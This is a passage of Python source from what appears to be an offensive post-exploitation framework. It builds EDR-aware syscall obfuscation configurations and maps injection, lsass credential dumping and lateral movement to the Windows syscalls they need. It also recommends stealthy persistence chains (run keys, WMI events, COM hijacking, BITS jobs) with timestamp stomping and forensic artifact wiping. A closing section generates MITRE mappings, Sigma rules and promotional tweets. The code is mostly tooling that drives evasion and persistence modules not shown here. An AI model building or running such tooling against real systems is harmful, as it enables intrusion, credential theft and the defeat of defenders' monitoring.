            result['error'] = 'Syscall obfuscator module not available'
            result['recommendation'] = 'Install syscall_obfuscator module'
            return result
        
        try:
            # Use AI selector
            selector = AIObfuscationSelector()
            layer, profile_info = selector.detect_and_select()
            
            profile = profile_info.get('profile', {})
            edr = profile_info.get('edr', SyscallEDRProfile.NONE)
            
            result['detected_edr'] = profile.get('name', 'None')
            result['primary_layer'] = layer.value
            result['secondary_layers'] = [l.value for l in profile.get('secondary_layers', [])]
            result['stub_pattern'] = profile.get('stub_pattern', StubPattern.STANDARD).value
            result['mutation_rate'] = profile.get('mutation_rate', 0.5)
            result['entropy_level'] = profile.get('entropy_level', 0.5)
            result['junk_ratio'] = profile.get('junk_ratio', 0.3)
            result['spoof_calls'] = [s.value for s in profile.get('spoof_calls', [])]
            result['delay_range_ms'] = list(profile.get('delay_range_ms', (10, 50)))
            result['recommendation'] = profile.get('notes', 'AI-selected obfuscation')
            
            # Get full recommendation text
            result['full_recommendation'] = selector.get_recommendation()
            
        except Exception as e:
            result['error'] = str(e)
            result['recommendation'] = f'Syscall obfuscation guidance failed: {e}'
        
        return result
    
    def create_syscall_obfuscator(
        self,
        target: str = None,
        ai_adaptive: bool = True,
        use_ml: bool = True,
        use_fresh_ssn: bool = True,
        enable_spoof: bool = True
    ):
        """
        Create a SyscallObfuscatorMonster with AI-recommended settings.
        
        Args:
            target: Target host for context
            ai_adaptive: Use AI-adaptive layer selection
            use_ml: Use ML/GAN-based mutation
            use_fresh_ssn: Resolve SSN from clean ntdll
            enable_spoof: Enable spoof call generation
        
        Returns:
            Configured SyscallObfuscatorMonster instance or None
        """
        if not HAS_SYSCALL_OBFUSCATOR:
            return None
        
        try:
            # Get AI recommendation first
            rec = self.get_syscall_obfuscation_recommendation(target)
            
            # Build config
            config = SyscallObfuscationConfig(
                ai_adaptive=ai_adaptive,
                use_ml_mutation=use_ml,
                use_fresh_ntdll=use_fresh_ssn,
                enable_spoof_calls=enable_spoof,
                mutation_rate=rec.get('mutation_rate', 0.7),
                junk_instruction_ratio=rec.get('junk_ratio', 0.5),
            )
            
            return SyscallObfuscatorMonster(config)
            
        except Exception as e:
            self.log_action("syscall_obfuscator_create", f"Failed: {e}")
            return None
    
    def recommend_syscall_for_operation(
        self,
        operation: str,
        target: str = None,
        sensitive: bool = True
    ) -> Dict[str, Any]:
        """
        Get syscall obfuscation recommendation for specific operation.
        
        Args:
            operation: Operation type (e.g., "injection", "credential_dump", "lateral_move")
            target: Target hostname
            sensitive: Whether this is a sensitive operation requiring max stealth
        
        Returns:
            Dict with operation-specific syscall guidance
        """
        result = {
            'operation': operation,
            'target': target,
            'recommended_layer': 'gan_mutate',
            'syscalls_needed': [],
            'obfuscation_settings': {},
            'opsec_requirements': [],
            'notes': [],
            'estimated_evasion_score': 0.85,
        }
        
        # Get base recommendation
        base_rec = self.get_syscall_obfuscation_recommendation(target)
        
        # Map operations to syscalls
        operation_syscalls = {
            'injection': [
                'NtAllocateVirtualMemory',
                'NtWriteVirtualMemory',
                'NtProtectVirtualMemory',
                'NtCreateThreadEx',
            ],
            'credential_dump': [
                'NtOpenProcess',
                'NtReadVirtualMemory',
                'NtQueryInformationProcess',
            ],
            'lateral_move': [
                'NtCreateFile',
                'NtWriteVirtualMemory',
                'NtCreateThreadEx',
                'NtOpenProcess',
            ],
            'persistence': [
                'NtCreateFile',
                'NtSetInformationFile',
                'NtWriteFile',
            ],
            'evasion': [
                'NtAllocateVirtualMemory',
                'NtProtectVirtualMemory',
                'NtCreateSection',
                'NtMapViewOfSection',
            ],
        }
        
        result['syscalls_needed'] = operation_syscalls.get(operation, ['NtOpenProcess'])
        
        # Set obfuscation based on sensitivity
        if sensitive:
            result['recommended_layer'] = 'full_monster'
            result['obfuscation_settings'] = {
                'primary_layer': base_rec['primary_layer'],
                'secondary_layers': base_rec['secondary_layers'],
                'stub_pattern': 'polymorphic' if base_rec['mutation_rate'] > 0.6 else 'junked',
                'mutation_rate': max(base_rec['mutation_rate'], 0.8),
                'entropy_level': max(base_rec['entropy_level'], 0.7),
                'spoof_before': True,
                'spoof_after': True,
                'artifact_wipe': True,
            }
            result['opsec_requirements'] = [
                'Use fresh SSN from clean ntdll',
                'Apply GAN mutation to all stubs',
                'Spoof syscalls before and after',
                'Wipe artifacts after each call',
                'Reseed mutation after 3 calls',
            ]
        else:
            result['recommended_layer'] = base_rec['primary_layer']
            result['obfuscation_settings'] = {
                'primary_layer': base_rec['primary_layer'],
                'secondary_layers': base_rec['secondary_layers'][:1],
                'stub_pattern': base_rec['stub_pattern'],
                'mutation_rate': base_rec['mutation_rate'],
                'entropy_level': base_rec['entropy_level'],
                'spoof_before': False,
                'spoof_after': True,
                'artifact_wipe': True,
            }
        
        # Calculate evasion score
        layer_scores = {
            'full_monster': 0.97,
            'gan_mutate': 0.92,
            'stub_swap': 0.88,
            'entropy_heavy': 0.85,
            'obfuscated_stub': 0.80,
            'fresh_ssn': 0.75,
            'indirect_call': 0.70,
            'none': 0.30,
        }
        
        result['estimated_evasion_score'] = layer_scores.get(
            result['recommended_layer'], 0.75
        )
        
        # Adjust for EDR
        if base_rec['detected_edr'] != 'None':
            result['notes'].append(f"EDR detected: {base_rec['detected_edr']}")
            result['notes'].append(base_rec['recommendation'])
        
        # Operation-specific notes
        if operation == 'injection':
            result['notes'].append('NtCreateThreadEx is heavily monitored - use max obfuscation')
        elif operation == 'credential_dump':
            result['notes'].append('NtReadVirtualMemory on lsass triggers alerts - use spoof heavily')
        elif operation == 'lateral_move':
            result['notes'].append('NtCreateFile for remote writes is suspicious - add timing jitter')
        
        return result
    
    # =========================================================================
    # PERSISTENCE GOD MODE GUIDANCE
    # =========================================================================
    
    def get_persistence_recommendation(self, target: str = None) -> Dict[str, Any]:
        """
        Get AI-guided persistence chain recommendation.
        
        Analyzes target defenses and recommends optimal persistence chain.
        
        Args:
            target: Target hostname (optional, for context)
        
        Returns:
            Dict with:
            - detected_edr: Primary EDR detected
            - primary_chain: Recommended persistence chain
            - secondary_chains: Additional chains for resilience
            - avoid_chains: Chains to avoid for this EDR
            - mutation_rate: Artifact mutation rate
            - spoof_events: Whether to generate spoof events
            - recommendation: Human-readable recommendation
        """
        result = {
            'detected_edr': 'None',
            'primary_chain': 'runkey',
            'secondary_chains': [],
            'avoid_chains': [],
            'mutation_rate': 0.5,
            'use_reg_muting': True,
            'timestamp_stomp': True,
            'spoof_events': True,
            'install_delay_ms': [1000, 5000],
            'recommendation': 'Default persistence chain',
            'error': None,
        }
        
        if not HAS_PERSISTENCE_GOD:
            result['error'] = 'Persistence god module not available'
            result['recommendation'] = 'Install persistence_god module'
            return result
        
        try:
            # Use AI selector
            selector = AIPersistenceSelector()
            chain, profile_info = selector.detect_and_select()
            
            profile = profile_info.get('profile', {})
            edr = profile_info.get('edr', EDRPersistProfile.NONE)
            
            result['detected_edr'] = profile.get('name', 'None')
            result['primary_chain'] = chain.value
            result['secondary_chains'] = [c.value for c in profile.get('secondary_chains', [])]
            result['avoid_chains'] = [c.value for c in profile.get('avoid_chains', [])]
            result['mutation_rate'] = profile.get('mutation_rate', 0.5)
            result['use_reg_muting'] = profile.get('use_reg_muting', True)
            result['timestamp_stomp'] = profile.get('timestamp_stomp', True)
            result['spoof_events'] = profile.get('spoof_events', True)
            result['install_delay_ms'] = list(profile.get('install_delay_ms', (1000, 5000)))
            result['recommendation'] = profile.get('notes', 'AI-selected persistence')
            
            # Get full recommendation text
            result['full_recommendation'] = selector.get_recommendation()
            
        except Exception as e:
            result['error'] = str(e)
            result['recommendation'] = f'Persistence guidance failed: {e}'
        
        return result
    
    def create_persistence_god(
        self,
        target: str = None,
        ai_adaptive: bool = True,
        multi_chain: bool = True,
        enable_spoof: bool = True
    ):
        """
        Create a PersistenceGodMonster with AI-recommended settings.
        
        Args:
            target: Target host for context
            ai_adaptive: Use AI-adaptive chain selection
            multi_chain: Install multiple persistence chains
            enable_spoof: Enable spoof event generation
        
        Returns:
            Configured PersistenceGodMonster instance or None
        """
        if not HAS_PERSISTENCE_GOD:
            return None
        
        try:
            # Get AI recommendation first
            rec = self.get_persistence_recommendation(target)
            
            # Build config
            config = PersistenceConfig(
                ai_adaptive=ai_adaptive,
                enable_multi_chain=multi_chain,
                enable_spoof_events=enable_spoof,
                mutation_rate=rec.get('mutation_rate', 0.7),
                use_reg_muting=rec.get('use_reg_muting', True),
                timestamp_stomp=rec.get('timestamp_stomp', True),
            )
            
            return PersistenceGodMonster(config)
            
        except Exception as e:
            self.log_action("persistence_god_create", f"Failed: {e}")
            return None
    
    def recommend_persistence_for_scenario(
        self,
        scenario: str,
        target: str = None,
        high_value: bool = True
    ) -> Dict[str, Any]:
        """
        Get persistence recommendation for specific scenario.
        
        Args:
            scenario: Scenario type (e.g., "post_lateral", "initial_access", "long_term")
            target: Target hostname
            high_value: Whether this is a high-value target requiring max stealth
        
        Returns:
            Dict with scenario-specific persistence guidance
        """
        result = {
            'scenario': scenario,
            'target': target,
            'recommended_chain': 'bits_job',
            'multi_chain': True,
            'chains_to_use': [],
            'persistence_settings': {},
            'opsec_requirements': [],
            'notes': [],
            'estimated_survival_score': 0.85,
        }
        
        # Get base recommendation
        base_rec = self.get_persistence_recommendation(target)
        
        # Scenario-specific settings
        scenario_configs = {
            'initial_access': {
                'recommended_chain': 'runkey',
                'multi_chain': False,
                'chains': ['runkey'],
                'notes': ['Quick install for initial foothold', 'Low profile'],
            },
            'post_lateral': {
                'recommended_chain': 'bits_job',
                'multi_chain': True,
                'chains': ['bits_job', 'com_hijack', 'runkey'],
                'notes': ['Multi-chain for resilience', 'Spread across techniques'],
            },
            'long_term': {
                'recommended_chain': 'full_chain',
                'multi_chain': True,
                'chains': ['wmi_event', 'com_hijack', 'bits_job', 'schtask', 'runkey'],
                'notes': ['Maximum resilience', 'All chains for immortal beacon'],
            },
            'high_security': {
                'recommended_chain': 'com_hijack',
                'multi_chain': True,
                'chains': ['com_hijack', 'dll_search'],
                'notes': ['Avoid obvious persistence', 'DLL-based is stealthiest'],
            },
        }
        
        config = scenario_configs.get(scenario, scenario_configs['post_lateral'])
        
        result['recommended_chain'] = config['recommended_chain']
        result['multi_chain'] = config['multi_chain']
        result['chains_to_use'] = config['chains']
        result['notes'] = config['notes']
        
        # Apply EDR-specific adjustments
        if base_rec['detected_edr'] != 'None':
            result['chains_to_use'] = [
                c for c in result['chains_to_use'] 
                if c not in base_rec['avoid_chains']
            ]
            result['notes'].append(f"EDR detected: {base_rec['detected_edr']}")
            result['notes'].append(f"Avoiding: {base_rec['avoid_chains']}")
        
        # High value target adjustments
        if high_value:
            result['persistence_settings'] = {
                'mutation_rate': max(base_rec['mutation_rate'], 0.9),
                'use_reg_muting': True,
                'timestamp_stomp': True,
                'spoof_before': True,
                'spoof_after': True,
                'artifact_wipe': True,
            }
            result['opsec_requirements'] = [
                'Enable maximum mutation',
                'Spoof events before and after install',
                'Timestamp stomp all artifacts',
                'Wipe forensic artifacts',
                'Reseed mutator after install',
            ]
        else:
            result['persistence_settings'] = {
                'mutation_rate': base_rec['mutation_rate'],
                'use_reg_muting': base_rec['use_reg_muting'],
                'timestamp_stomp': base_rec['timestamp_stomp'],
                'spoof_before': False,
                'spoof_after': True,
                'artifact_wipe': True,
            }
        
        # Calculate survival score
        chain_scores = {
            'full_chain': 0.96,
            'wmi_event': 0.90,
            'com_hijack': 0.88,
            'bits_job': 0.85,
            'dll_search': 0.82,
            'schtask': 0.75,
            'runkey': 0.65,
            'service': 0.60,
            'startup_folder': 0.50,
        }
        
        result['estimated_survival_score'] = chain_scores.get(
            result['recommended_chain'], 0.70
        )
        
        # Bonus for multi-chain
        if result['multi_chain']:
            result['estimated_survival_score'] = min(
                result['estimated_survival_score'] + 0.05 * len(result['chains_to_use']),
                0.96
            )
        
        return result
    
    # =========================================================================
    # REPORTING & VISUALIZATION
    # =========================================================================
    
    def generate_chain_report(
        self,
        chain_log: Any = None,
        output_dir: str = "reports",
        format: str = "html",
        include_sigma: bool = True,
        include_mitre: bool = True
    ) -> Dict[str, Any]:
        """
        Generate comprehensive attack chain report.
        
        Args:
            chain_log: ChainLog object or None for sample
            output_dir: Output directory for reports
            format: Output format (html, pdf, json, all)
            include_sigma: Include Sigma detection rules
            include_mitre: Include MITRE ATT&CK mapping
        
        Returns:
            Dict with report paths and generated content
        """
        result = {
            'success': False,
            'report_path': '',
            'html_path': '',
            'pdf_path': '',
            'sigma_rules': [],
            'mitre_coverage': {},
            'ai_summary': '',
            'twitter_thread': [],
            'error': None,
        }
        
        if not HAS_REPORT_GENERATOR:
            result['error'] = 'Report generator module not available'
            return result
        
        try:
            # Create chain log if not provided
            if chain_log is None:
                chain_log = create_sample_chain_log()
            
            # Create report generator with config
            config = ReportConfig(
                enable_ai_summary=True,
                enable_mitre_map=include_mitre,
                enable_sigma_generate=include_sigma,
                format=ReportFormat[format.upper()],
                output_dir=output_dir,
                anonymize_data=True,
            )
            
            generator = ReportGenerator(config)
            report_result = generator.generate_report(chain_log, output_dir)
            
            # Copy results
            result['success'] = report_result.success
            result['report_path'] = report_result.report_path
            result['html_path'] = report_result.html_path
            result['pdf_path'] = report_result.pdf_path
            result['ai_summary'] = report_result.ai_summary
            result['twitter_thread'] = report_result.twitter_thread
            result['sigma_rules'] = [r.to_yaml() for r in report_result.sigma_rules]
            result['mitre_coverage'] = {
                k: {
                    'technique_id': v.technique_id,
                    'technique_name': v.technique_name,
                    'tactic': v.tactic.name,
                    'success_count': v.success_count,
                    'evasion_score': v.evasion_score,
                }
                for k, v in report_result.mitre_coverage.items()
            }
            
            if report_result.error:
                result['error'] = report_result.error
            
        except Exception as e:
            result['error'] = str(e)
            self.log_action("report_generation", f"Failed: {e}")
        
        return result
    
    def get_ai_report_summary(
        self,
        chain_log: Any = None,
        style: str = "executive"
    ) -> str:
        """
        Get AI-generated report summary.
        
        Args:
            chain_log: ChainLog object or None for sample
            style: Summary style (executive, technical, twitter)
        
        Returns:
            AI-generated summary string
        """
        if not HAS_REPORT_GENERATOR:
            return "Report generator not available"
        
        try:
            # Create chain log if not provided
            if chain_log is None:
                chain_log = create_sample_chain_log()
            
            # Map to MITRE
            mapper = MITREMapper()
            mitre_coverage = mapper.map_chain_log(chain_log)
            
            # Generate summary
            ai_gen = AISummaryGenerator()
            return ai_gen.generate_summary(chain_log, mitre_coverage, style)
            
        except Exception as e:
            return f"Summary generation failed: {e}"
    
    def generate_sigma_rules(
        self,
        chain_log: Any = None
    ) -> List[str]:
        """
        Generate Sigma detection rules from chain log.
        
        Args:
            chain_log: ChainLog object or None for sample
        
        Returns:
            List of Sigma rules in YAML format
        """
        if not HAS_REPORT_GENERATOR:
            return ["# Report generator not available"]
        
        try:
            # Create chain log if not provided
            if chain_log is None:
                chain_log = create_sample_chain_log()
            
            # Map to MITRE
            mapper = MITREMapper()
            mitre_coverage = mapper.map_chain_log(chain_log)
            
            # Generate rules
            generator = SigmaRuleGenerator()
            rules = generator.generate_rules(chain_log, mitre_coverage)
            
            return [r.to_yaml() for r in rules]
            
        except Exception as e:
            return [f"# Rule generation failed: {e}"]
    
    def get_mitre_heatmap_data(
        self,
        chain_log: Any = None
    ) -> Dict[str, Any]:
        """
        Get MITRE ATT&CK heatmap data for visualization.
        
        Args:
            chain_log: ChainLog object or None for sample
        
        Returns:
            Dict with heatmap data for each tactic/technique
        """
        if not HAS_REPORT_GENERATOR:
            return {"error": "Report generator not available"}
        
        try:
            # Create chain log if not provided
            if chain_log is None:
                chain_log = create_sample_chain_log()
            
            # Map to MITRE
            mapper = MITREMapper()
            mitre_coverage = mapper.map_chain_log(chain_log)
            
            return mapper.generate_heatmap_data(mitre_coverage)
            
        except Exception as e:
            return {"error": str(e)}
    
    def generate_twitter_thread(
        self,
        chain_log: Any = None
    ) -> List[str]:
        """
        Generate Twitter/X thread for demo.
        
        Args:
            chain_log: ChainLog object or None for sample
        
        Returns:
            List of tweets for thread
        """
        if not HAS_REPORT_GENERATOR:
            return ["Report generator not available"]
        
        try:
            # Create chain log if not provided
            if chain_log is None:
                chain_log = create_sample_chain_log()
            
            # Map to MITRE
            mapper = MITREMapper()
            mitre_coverage = mapper.map_chain_log(chain_log)
            
            # Generate thread
            ai_gen = AISummaryGenerator()
            return ai_gen.generate_twitter_thread(chain_log, mitre_coverage)
            
        except Exception as e:
            return [f"Thread generation failed: {e}"]
    
    def create_report_generator(
        self,
        format: str = "html",
        style: str = "dark",
        anonymize: bool = True
    ):
        """
        Create configured ReportGenerator instance.
        
        Args:
            format: Output format
            style: Visual theme
            anonymize: Anonymize sensitive data
        
        Returns:
            ReportGenerator instance or None
        """
        if not HAS_REPORT_GENERATOR:
            return None
        
        try:
            return create_report_generator(
                enable_ai=True,
                enable_mitre=True,
                enable_sigma=True,
                format=format,
                style=style
            )
        except Exception as e:
            self.log_action("create_report_generator", f"Failed: {e}")
            return None